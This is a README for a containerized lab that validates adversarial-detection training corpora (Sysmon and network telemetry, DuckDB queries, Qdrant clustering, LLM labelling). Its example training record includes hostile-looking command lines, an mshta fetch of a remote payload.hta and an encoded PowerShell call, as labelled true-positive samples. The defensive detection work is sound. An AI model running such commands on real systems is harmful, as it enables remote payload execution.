# Sentinel Nexus -- MLOps Pre-Production Corpus Gate

A fully containerized validation lab that proves new adversarial detection training data is
correct **before** it enters the production MLOps pipeline. This is the primary mechanism for
continuously improving the model's ability to detect true positives and reject false positive
system noise.

---

## One-command execution

```bash
cd tests/mlops_eval_minilab
cp .env.example .env       # optional: change EVAL_MODEL
podman-compose up          # or: docker compose up
```

The runner exits `0` (PASS → promote) or `1` (FAIL → revise). Reports land in `reports/`.

---

## Why this matters

The ML model's detection quality depends entirely on three things:
1. **Training data quality** -- are the TP behavioral signals distinctive enough?
2. **FP discriminator quality** -- are the admin/benign scenarios described accurately?
3. **Spatial math validity** -- do TP records cluster in vector space away from FP records?

This lab validates all three **before** spending GPU hours training. A corpus class that fails
here will either produce a model that misses real attacks (low recall) or floods analysts with
false positives (low precision). The minilab catches these issues in minutes on a laptop.

---

## How the phases work

### Phase 1 -- Structural Integrity (no services required, ~3 seconds)
```
pytest test_eval_pipeline.py -m "not ollama" -v
```

Checks every corpus JSONL for:
- All required fields present (ttp_category, tool_class, source_type, vector_name, etc.)
- classification is "true_positive" or "false_positive" (never anything else)
- vector_name matches the expected vector space for the sensor type
- Every user message contains `<|spatial_vector|>` (the sensor vector injection point)
- Every assistant message (golden label) contains `[AXIS 1]` Chain-of-Thought markers
- TP golden labels say "TRUE POSITIVE", FP golden labels say "FALSE POSITIVE"
- TP:FP ratio is 3–7:1 (corpus design target: 5:1)

**What failure means:** The corpus JSONL itself is structurally invalid -- fix before running services.

---

### Phase 2 -- DuckDB S3 Query Simulation (no Ollama/Qdrant, ~10 seconds)

The production spool script (`01_spool_datasets.py` Track 6) uses DuckDB to query S3 Parquet
with behavioral WHERE clauses from the `*_query_index.json` files. This phase runs those exact
same queries against synthetic sensor Parquet files to prove:

- TP simulation rows **MATCH** the behavioral WHERE clause (the attack pattern is detectable)
- FP simulation rows **DO NOT MATCH** (the benign admin scenario doesn't trigger the detector)

**What failure means:**
- `TP:0/N` → The WHERE clause is wrong OR the TP description doesn't contain the right field values
- `FP matched` → The WHERE clause is too broad -- it will trigger on legitimate admin activity
- `ERR: column not found` → The staging script S3 query references a column that doesn't exist in the sensor schema

**This is the most important gate.** If it fails, the production Track 6 will return zero rows for
this class silently, and the model will never see live telemetry for this attack pattern.

---

### Phase 3 -- Qdrant Vector Clustering (requires Qdrant at :6333, ~30 seconds)

Ingests the synthetic sensor vectors into local Qdrant and validates that:
- TP records for the same tool_class cluster together (cosine similarity > 0.6)
- FP records are in a different spatial region (not near the TP cluster)
- K-NN search from a TP query returns more TP than FP neighbors

**What failure means:**
- TP and FP records are spatially indistinguishable → the sensor vector features don't capture
  the behavioral difference → the mathematical tripwire won't fire on this attack
- Fix: strengthen the discriminating field values (anomaly_score, pc_score, entropy, etc.)
  or add more distinctive behavioral signals to the corpus descriptions

---

### Phase 4 -- LLM Inference Validation (requires Ollama + model, ~3 min)

The most critical gate. Loads the corpus training records as few-shot context, then sends
simulated telemetry to the model and validates:
- **TP telemetry → model outputs "TRUE POSITIVE"** with correct CoT reasoning
- **FP telemetry → model outputs "FALSE POSITIVE"** with "dismiss" action
- CoT axes present ([AXIS 1] Benign Alternative, [AXIS 2] Behavioral Proof, [AXIS 3] Entity Coverage)
- MITRE ATT&CK technique IDs present in TP responses
- Latency is within acceptable range

**Expected zero-shot accuracy (before fine-tuning): 60–75%**
**Expected after QLoRA fine-tuning on production cluster: >90%**

**What failure means:**
- Low TP accuracy → SYS prompt behavioral descriptions aren't distinctive enough; rewrite
  the user message to include more specific attack-indicative field values
- Low FP accuracy → Admin FP discriminators are too weak; strengthen the contrast in
  the assistant message (state clearly WHY the admin scenario is different)
- CoT missing → The few-shot examples don't provide enough structural guidance; ensure
  training records have complete [AXIS 1]/[AXIS 2]/[AXIS 3]/[CONCLUSION] structure

---

## Corpus JSONL format -- complete specification

Each line in the corpus JSONL is one training record:

```json
{
  "ttp_category":     "LOTL",
  "tool_class":       "BinaryProxyMshta",
  "mitre_techniques": ["T1218.005"],
  "source_type":      "sysmon_sensor",
  "vector_name":      "windows_math",
  "classification":   "true_positive",
  "event_id":         "a1b2c3d4e5f6a7b8",
  "messages": [
    {
      "role": "system",
      "content": "You are the Host Forensics Expert. Target OS: Windows. Vector Space: 6D windows_math. Source: Sysmon event stream. Schema: sysmon_event_id, Image, CommandLine, ParentImage, User, IntegrityLevel, GrantedAccess, ... Identify adversarial tradecraft. Output MITRE ATT&CK + containment recommendation."
    },
    {
      "role": "user",
      "content": "Spatial Anomaly Detected.\nSource: sysmon_sensor\nVector: <|spatial_vector|>\nWindows Host Telemetry -- mshta.exe LOLBAS Proxy Execution.\nHost: WS-35  User: jsmith\n  EventID=1 (Process Create)\n    Image: mshta.exe  ParentImage: WINWORD.EXE\n    CommandLine: mshta.exe http://185.220.x.x/payload.hta\n  EventID=1 (child from mshta.exe)\n    Image: cmd.exe  ParentImage: mshta.exe"
    },
    {
      "role": "assistant",
      "content": "<analysis>\n[AXIS 1] Benign Alternative Assessment:\n  mshta.exe is used legitimately for HTA applications -- but only from Program Files, signed by IT, never spawning cmd.exe.\n[AXIS 2] Behavioral Proof Assessment:\n  mshta.exe spawning cmd.exe from a remote URL = proxy execution. Office parent (WINWORD) has no legitimate reason to invoke mshta.exe.\n[AXIS 3] Entity Coverage:\n  Host WS-35 (jsmith): mshta proxy executed payload. C2 channel established via cmd.exe child.\n[CONCLUSION] mshta.exe LOLBAS proxy execution confirmed.\n</analysis>\nTRUE POSITIVE. MITRE T1218.005 (System Binary Proxy Execution: Mshta).\nRECOMMENDED_ACTION: contain"
    }
  ],
  "sim_overrides": {
    "tp": {
      "Image":         "cmd.exe",
      "ParentImage":   "mshta.exe",
      "sysmon_event_id": 1,
      "CommandLine":   "cmd.exe /c powershell -enc SGVsbG8="
    },
    "fp": {
      "Image":         "mshta.exe",
      "ParentImage":   "explorer.exe",
      "sysmon_event_id": 1,
      "CommandLine":   "mshta.exe C:\\Program Files\\ITTools\\admin.hta"
    }
  }
}
```

### Required fields

| Field | Type | Description |
|-------|------|-------------|
| `ttp_category` | string | TTP category matching the corpus_testing subdirectory name |
| `tool_class` | string | Unique name for this detection class (CamelCase) |
| `mitre_techniques` | list[str] | MITRE ATT&CK technique IDs (e.g., ["T1218.005"]) |
| `source_type` | string | Sensor type: `sysmon_sensor`, `linux_sentinel`, `network_tap`, etc. |
| `vector_name` | string | Vector space: `windows_math`, `sentinel_math`, `network_tap`, `c2_math` |
| `classification` | string | `"true_positive"` or `"false_positive"` |
| `messages` | list | system + user + assistant messages (the training example) |

### The `<|spatial_vector|>` token

Every user message MUST contain `<|spatial_vector|>` at the point where the sensor's
pre-computed feature vector gets injected at inference time. This is what connects the
numerical behavioral signal to the model's reasoning:

```
"Spatial Anomaly Detected.\nSource: sysmon_sensor\nVector: <|spatial_vector|>\n[telemetry here]"
```

The SpatialProjector maps the 6D windows_math vector into the model's 4096D embedding space
at this token position. Without it, the model processes text-only -- no spatial signal.

### The `sim_overrides` field (recommended for new training sets)

By default the simulation data generator extracts sensor field values from the narrative text
of the user message using regex patterns. This works for corpus classes that follow the
existing patterns but **WILL produce incorrect simulation data** for:
- New sensor types not yet in the generator
- Attack patterns with unusual field combinations
- Custom behavioral scenarios outside the existing TTP library

`sim_overrides` gives you explicit control over what sensor Parquet values the test generates:

```json
"sim_overrides": {
  "tp": {
    "sysmon_event_id": 10,
    "TargetImage":     "winlogon.exe",
    "GrantedAccess":   "0x1fffff",
    "Image":           "exploit.exe"
  },
  "fp": {
    "sysmon_event_id": 10,
    "TargetImage":     "winlogon.exe",
    "GrantedAccess":   "0x1000",
    "Image":           "SecurityHealthService.exe"
  }
}
```

This is the **recommended approach** for any new training data. The sim_overrides values:
1. Map directly to Parquet column names (must match the sensor schema exactly)
2. Are applied BEFORE the WHERE-guided overrides (highest priority)
3. Apply only to matching classification rows (tp → true_positive, fp → false_positive)

---

## Adding a completely new training set

### Step 1: Define the attack behavioral signature

Before writing any JSONL, answer:
- What sensor captures this? (sysmon? linux_sentinel? network_tap?)
- What EventID / syscall / network pattern is discriminating?
- What field values separate the attack from legitimate admin activity?
- What is the S3 query that would match this in live telemetry?

### Step 2: Write the corpus JSONL

```bash
# Create the category directory
mkdir -p corpus_testing/MY_NEW_CATEGORY

# Write corpus records (manually or via your staging script generator)
vim corpus_testing/MY_NEW_CATEGORY/MyNewClass.jsonl
```

Minimum viable corpus: **6 records** -- 4 TP + 2 FP. More is better (8 TP + 2 FP recommended).

### Step 3: Add the S3 query to the staging script

In `mlops/scripts/stage_<category>_behavioral.py`, add your class to `S3_QUERIES`:

```python
S3_QUERIES = {
    ...
    "MyNewClass": {
        "sensor": "sysmon_sensor",
        "where": "sysmon_event_id = 1 AND Image LIKE '%exploit%' AND ParentImage LIKE '%winword%'",
    },
```

This is what Track 6 in `01_spool_datasets.py` will run against live S3 Parquet.
The minilab DuckDB gate validates this query works correctly before you train.

### Step 4: Verify S3 query column names match sensor schema

**This is the most common mistake.** Check `services/config/nexus.toml` for the
`[schema_mappings.your_sensor]` section. The WHERE clause must use the column names
in `context_columns` and `vector_columns`, NOT abstracted names.

Common mismatches found during minilab development:
| Staging script used | Actual Parquet column |
|---|---|
| `registry_path` | `TargetObject` (sysmon) |
| `inter_arrival_cv` | `variance_inter_arrival` (network_tap) |
| `driver_name` | `ImageLoaded` (sysmon) |
| `file_path` | `target_file` (linux_sentinel) |
| `syscall` | `comm` (linux_sentinel) |

Add `sim_overrides` to your corpus record with the CORRECT Parquet column names.

### Step 5: Run the minilab

```bash
podman-compose up
```

### Step 6: Interpret the results

```
reports/corpus_gate_20260603_142301.json
```

| Gate result | Meaning | Fix |
|---|---|---|
| DuckDB TP:0/4 | WHERE clause doesn't match TP rows | Fix S3 query OR add `sim_overrides` |
| DuckDB FP>0 | WHERE clause too broad | Tighten the S3 WHERE clause |
| Qdrant FAIL | TP/FP vectors too similar | Add more distinctive behavioral signals |
| LLM TP < 60% | Corpus descriptions not distinctive | Rewrite user message content |
| LLM FP < 50% | FP discriminators too weak | Strengthen FP assistant explanations |

### Step 7: Promote to production

```bash
# 1. Generate the full staging script
cp corpus_testing/MY_NEW_CATEGORY/MyNewClass.jsonl \
   mlops/scripts/stage_my_new_behavioral.py  # (restructure as staging script)

# 2. Add to Makefile
echo "stage-mynew: python3 scripts/stage_my_new_behavioral.py" >> mlops/Makefile

# 3. Copy to corpus templates
cp corpus_testing/MY_NEW_CATEGORY/MyNewClass.jsonl \
   adversarial_corpus_templates/MY_NEW_CATEGORY/

# 4. Add to data-all target in Makefile
# 5. Run make data-all
```

---

## Vector space reference

| sensor_type | vector_name | Dimensions | Vector fields |
|---|---|---|---|
| `sysmon_sensor` | `windows_math` | 6D | command_entropy, parent_child_score, integrity_score, anomaly_score, grant_access_score, driver_trust_score |
| `windows_deepsensor` | `deepsensor_math` | 4D | score, avg_entropy, max_velocity, event_count |
| `trellix_ens` | `trellix_math` | 4D | severity_score, threat_score, action_score, anomaly_score |
| `linux_sentinel` | `sentinel_math` | 5D | shannon_entropy, execution_velocity, tuple_rarity, path_depth, anomaly_score |
| `linux_c2`, `windows_c2`, `suricata_eve` | `c2_math` | 8D | outbound_ratio, packet_size_mean, packet_size_std, interval, cv, entropy, cmd_entropy, score |
| `network_tap` | `network_tap` | 8D | byte_ratio, avg_inter_arrival, variance_inter_arrival, ratio_small_packets, ratio_large_packets, payload_entropy, session_duration_ms, packets_src |
| `aws_cloudtrail`, `azure_entraid`, `gcp_audit`, `vmware_syslog` | `cloud_flow` | 5D | interval, cv, outbound_ratio, packet_size_mean, score |

---

## Container architecture

```
podman-compose up
    │
    ├── nexus-eval-ollama    (stays up)  → :11434
    ├── nexus-eval-qdrant    (stays up)  → :6333
    ├── nexus-eval-webui     (stays up)  → :3000  (OpenWebUI for manual inspection)
    ├── nexus-eval-init      (exits)     → pulls EVAL_MODEL into ollama
    └── nexus-eval-runner    (exits 0/1) → runs all 5 gates, writes report
```

After the eval-runner exits, Ollama + Qdrant + OpenWebUI remain running for:
- Manual prompt testing in OpenWebUI at http://localhost:3000
- Direct Qdrant inspection at http://localhost:6333/dashboard
- Rerunning the eval without restarting services: `podman restart nexus-eval-runner`

---

## Model selection

| Model | VRAM/RAM | Speed | Zero-shot accuracy | Notes |
|---|---|---|---|---|
| `llama3.2:1b` | ~1GB | ~3s/rec | 45-55% | Structural proof only |
| **`llama3.2:3b`** | ~2GB | ~8s/rec | **60-68%** | **Default -- good balance** |
| `phi3:mini` | ~2.3GB | ~10s/rec | 65-72% | Best reasoning per GB |
| `llama3.1:8b-q4` | ~5GB GPU | ~4s/rec | 70-78% | Best laptop GPU choice |
| `deepseek-r1:7b` | ~5GB GPU | ~6s/rec | 72-80% | Strong CoT output |

```bash
EVAL_MODEL=phi3:mini podman-compose up
EVAL_MODEL=llama3.1:8b-instruct-q4_0 EVAL_VERBOSE=1 podman-compose up
```

---

## Production MLOps integrity findings

Building this minilab exposed production MLOps issues that are now tracked in `BACKLOG.md`:

### Finding 1: Track 6 S3 query column aliases (HIGH)
Several staging scripts write WHERE clauses with column aliases that **don't match actual sensor Parquet columns**. When these run against real S3 Parquet, they return 0 rows silently.

| Script | Uses | Actual Parquet column |
|---|---|---|
| stage_persistence_behavioral.py | `registry_path` | `TargetObject` |
| stage_bypass_behavioral.py | `target_module`, `driver_name` | `ImageLoaded` |
| stage_c2_behavioral.py | `inter_arrival_cv` | `variance_inter_arrival` |
| stage_lateral_movement_behavioral.py | `file_path` | `target_file` |
| stage_linux_exploitation_behavioral.py | `syscall` | `comm` |

**Fix needed:** Align S3 query column names with actual sensor Parquet schemas in the staging scripts, OR update `01_spool_datasets.py` Track 6 to apply the same column alias mapping.

### Finding 2: Classes with s3_query=None lack live telemetry (MEDIUM)
`ADDomainEnum`, `PassTheHashLateral`, and other classes have `s3_query: None` in their query indices. The production Track 6 skips these entirely -- the model only sees offline synthetic training data, never correlated live telemetry for these patterns.

**Fix needed:** Add behavioral S3 queries to these classes, or explicitly document which classes are offline-only.

### Finding 3: Partial WHERE clause coverage (LOW)
Some WHERE clauses only match a subset of TP patterns. Example: `RegistryRunKey` WHERE clause matches `HKCU\CurrentVersion\Run` but corpus records include `HKCU\CurrentVersion\RunOnce` and other persistence locations. The production Track 6 misses these live telemetry matches.

**Fix needed:** Review WHERE clauses for completeness and broaden LIKE patterns where needed.

---

## Makefile targets

```bash
make up              # Run full eval (podman-compose up + report)
make build           # Rebuild eval-runner image only
make logs            # Follow eval-runner logs live
make status          # Show all container states
make report          # Print last report summary
make down            # Stop containers (keep volumes)
make clean           # Stop containers + wipe all state (model cache + Qdrant)

# Populate all categories from production staging corpus:
make populate        # Runs populate_examples.py

# Run structural checks without any services:
make eval-quick      # pytest -m "not ollama"
```

---

## Directory structure

```
mlops_eval_minilab/
├── docker-compose.yml          Full stack: Ollama + Qdrant + OpenWebUI + eval-runner
├── Dockerfile.eval             Python eval container image
├── .env.example                Configuration template
├── requirements.txt            Python deps (no PyTorch -- lightweight)
│
├── corpus_testing/             ← Drop new corpus JSONL here
│   ├── 1_Recon/
│   ├── 2_Persistence/
│   ├── 3_C2/
│   ├── 4_Bypass_Detection/
│   ├── 5_Lateral_Movement/
│   ├── 6_LOTL/
│   ├── 6_Malware_Tradecraft/
│   ├── 7_Exfiltration/
│   ├── Active-Directory/
│   ├── Windows_Exploitation/
│   └── Linux_Exploitation/
│
├── simulation_data/            ← Auto-generated sensor Parquet (exact sensor schemas)
│   └── (mirrors corpus_testing structure)
│
├── reports/                    ← JSON test reports (one per run)
│
├── eval_runner.py              Main eval orchestrator (entry point for container)
├── sim_data_generator.py       Sensor Parquet generator (exact sensor schemas)
├── duckdb_validator.py         DuckDB S3 query simulation
├── qdrant_validator.py         Qdrant vector clustering validation
├── populate_examples.py        Pre-populate all categories from production corpus
│
├── eval_pipeline.py            Original single-file eval (kept for reference)
├── eval_corpus_subset.py       Stratified corpus sampler
├── test_eval_pipeline.py       pytest structural checks
└── pytest.ini                  Mark definitions
```
